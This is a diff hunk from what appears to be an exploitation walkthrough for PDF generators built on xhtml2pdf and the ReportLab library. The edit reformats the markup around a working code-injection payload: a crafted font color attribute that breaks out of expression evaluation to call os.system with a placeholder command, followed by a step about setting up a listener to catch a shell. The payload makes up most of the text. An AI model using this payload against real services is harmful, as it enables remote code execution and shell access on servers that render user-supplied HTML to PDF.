@@ -12,9 +12,9 @@
 
 #### 2) Upon inspection, if we find that the producer is xhtml2pdf and/or with strings we find that the pdf is being generated with reportlab library, we craft an exploit to gain code execution.
 
-<para<<font color="[[[getattr(pow, Word('__globals__'))['os'].system('INJECT_COMMAND_HERE') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"<
+    <para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('INJECT_COMMAND_HERE') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"<
                 exploit
-</font></para<
+                </font></para>
 
 #### 3) Setup listener to catch the shell
 
